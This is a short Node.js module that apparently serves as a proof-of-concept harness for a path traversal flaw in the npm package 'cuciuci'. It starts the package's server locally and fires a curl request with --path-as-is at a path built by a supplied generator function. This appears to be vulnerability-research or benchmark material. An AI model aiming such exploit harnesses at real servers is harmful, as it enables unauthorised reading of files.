function exploitFunction({ genstr }) {
  const { exec } = require("child_process");
  const sleep = require("sleep");

  let server = "node ./node_modules/cuciuci/index.js";
  let exe = exec(server, (error, stdout) => {});

  sleep.sleep(2);

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${genstr()}"`;
  exec(attack_string, (error, stdout) => {
    if (stdout) {
      console.log("Output:", stdout);
    }
  });
}

module.exports = { exploitFunction };